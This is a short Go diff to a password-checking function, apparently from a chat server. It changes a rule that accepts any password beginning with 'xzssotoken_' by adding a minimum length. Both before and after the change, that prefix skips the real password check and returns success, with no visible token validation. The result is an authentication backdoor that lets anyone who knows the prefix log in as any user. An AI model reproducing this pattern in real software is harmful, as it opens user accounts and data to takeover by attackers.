@@ -64,8 +64,8 @@ func (a *App) CheckPasswordAndAllCriteria(rctx request.CTX, user *model.User, pa
 		return err
 	}
 
-	// 判断如果 密码以 xzssotoken_ 开头的话 就返回 nul
-	if strings.HasPrefix(password, "xzssotoken_") {
+	// If the password starts with 'xzssotoken_' and its length is greater than 18 characters, then return null.
+	if strings.HasPrefix(password, "xzssotoken_") && len(password) > 18 {
 		return nil
 	}
 	if err := users.CheckUserPassword(user, password); err != nil {
